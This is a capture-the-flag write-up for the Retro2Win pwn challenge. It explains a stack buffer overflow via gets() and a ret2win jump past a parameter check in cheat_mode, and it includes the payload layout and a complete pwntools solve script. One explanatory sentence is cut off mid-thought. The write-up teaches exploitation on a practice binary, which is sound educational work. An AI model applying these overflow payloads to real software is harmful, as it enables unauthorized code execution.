---
tags: ["ret2win", "stack-bof"]
download-link: ""
---

# 1337 Up | Retro2Win - PWN (100)

This is a straightforward ROP2Win challenge that involves exploiting a buffer overflow to control the return pointer and returning into a function that prints the flag.

## Initial Analysis

### Checksec
First thing is to look at basic memory protections

``` bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Key things to note:
- lack of stack canary, so stack smashing is possible
- No PIE, so there is no need for a .text leak for ROP

### Binary Review
When opening up `main()` the first thing that pops out is a call to `enter_cheatcode()`

``` c
if (choice != 1337) goto LAB_0040093b;
    enter_cheatcode();
```

By giving the menu option `1337` we can call `enter_cheatcode()`, which contains a stack buffer overflow vulnerability

``` c
void enter_cheatcode(void) {
  char buff [16];
  
  puts("Enter your cheatcode:");
  gets(buff);
  printf("Checking cheatcode: %s!\n",buff);
  return;
}
```

Looking through potential places to jump to, we notice the function `cheat_mode`, which gives us everything we need to solve this challenge

``` c
void cheat_mode(long param_1,long param_2) {
    if ((param_1 == 0x2323232323232323) && (param_2 == 0x4242424242424242)) {
    puts("CHEAT MODE ACTIVATED!");
    puts("You now have access to secret developer tools...\n");
    flag_file = fopen("flag.txt","r");
    ...
    else {
      pcVar1 = fgets(flag,0x40,flag_file);
      if (pcVar1 != (char *)0x0) {
        printf("FLAG: %s\n",flag);
      }
      fclose(flag_file);
    }
    ...
}
```

Summarizing the findings:
- `enter_cheatcode()` has a buffer overflow vulnerability that let's us control `RIP`
- the address to cheat_mode is known because of `No PIE`

## Exploitation
First thing is to set the option to 1337 in order to call the `enter_cheatcode()` function.
From there we can exploit the buffer overflow by overflowing the buffer and RBP with `0x18` bytes, and then overwriting RIP with the next `8` bytes.

The issue with overwriting `0x18` bytes is that RBP gets overwritten, then leave is called. So when this function exits RBP

### Picking return address
Looking at the `cheat_mode` function it appears there is a guarding clause which is checking that input parameters are set a specific way.
This can be bypassed by returning to the address after the guarding clause check.

``` asm
; Compare first parameter
00400746    MOV        RAX,0x2323232323232323
00400750    CMP        qword ptr [RBP + local_60],RAX
00400754    JNZ        LAB_004007e2

; Compare second parameter
0040075a    MOV        RAX,0x4242424242424242
00400764    CMP        qword ptr [RBP + local_68],RAX
00400768    JNZ        LAB_004007e2

; Print flag, if both parameters pass checks
0040076a    MOV        EDI=>s_CHEAT_MODE_ACTIVATED!
0040076f    CALL       <EXTERNAL>::puts
00400774    MOV        EDI=>s_You_now_have_access_to_sec...
00400779    CALL       <EXTERNAL>::puts
```

Since there is `No PIE`, returning to the address `0x0040076a` will skip the guard clause and print the flag.

### Problems with RBP
Because we skipped the prologue, which usually contains basic stack frame setup

``` asm
00400736    PUSH       RBP
00400737    MOV        RBP,RSP
0040073a    SUB        RSP,0x60
```

RBP is still the value that we set it `0x4141414141414141`. Local values are usually referenced by the stack frame pointer (RBP), which is what is causing the seg fault since `0x4141414141414141 - 0x10` is not valid memory space.

``` asm
0040078d    MOV        qword ptr [RBP + local_10],RAX
00400791    CMP        qword ptr [RBP + local_10],0x0
```

To fix this we need to get RBP to be a valid place in memory which is writeable (since we are moving values into it).
This can usually be found in the segment that holds sections like `.bss` and `.data`.
I picked the address `0x00602800`, but any scratch space location should do the trick.

``` python
payload = b'A' * 0x10
payload += p64(0x00602800) # RBP
payload += p64(0x0040076a) # RIP
```

Making that change should fix the seg fault and give us the flag! It's important to know that there are [other methods](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/exploiting-calling-conventions) for solving this challenge that don't involve messing with RBP, this is just the route that I chose.

## Solve Script
``` python
from pwn import *

BINARY = './retro2win'
HOST = ''
GDB_SCRIPT = ''

def main():
    proc = get_process() # set is_remote = False for local testing

    payload = b''.join([
        b'A'*0x10,
        p64(0x00602800), #RBP
        p64(0x0040076a), #RIP
    ])

    proc.sendlineafter(b'Select an option:', b'1337')
    proc.sendlineafter(b'Enter your cheatcode:', payload)
    proc.recvuntil(b'FLAG: ')
    flag = proc.recvline().strip().decode()
    print(f'Flag: {flag}')

# Allows compatibility if custom library isn't present
try:
    from ctfkit.bp import *
    tpwn.GDB_SCRIPT = GDB_SCRIPT
except ImportError:
    def get_process(is_remote=True):
        host, port = HOST.split(':')
        return remote(host, int(port)) if is_remote else process()

if __name__ == '__main__':
    try:
        context.binary = BINARY
    except FileNotFoundError:
        print('Not able to load binary, local testing disabled')
    context.log_level = 'error'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

    parse_args()
    main()
```